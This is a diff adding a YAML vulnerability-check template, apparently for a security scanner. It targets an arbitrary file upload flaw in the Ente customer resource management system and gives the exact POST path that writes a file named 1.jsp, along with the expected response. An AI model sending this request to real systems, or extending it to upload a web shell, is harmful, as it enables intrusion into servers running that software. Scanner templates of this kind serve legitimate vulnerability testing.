@@ -1,0 +1,23 @@
+id:
+
+info:
+  name: 浙大恩特客户资源管理系统 fileupload任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /entsoft_en/entereditor/jsp/fileupload.jsp?filename=1.jsp
+  headers:
+    Accept-Encoding: gzip
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5iALAXlSiqxJXrhK
+  data: |
+    123
+response1:
+  headers:
+  body: jsp
+  code: 200
+requests2:
+response2:
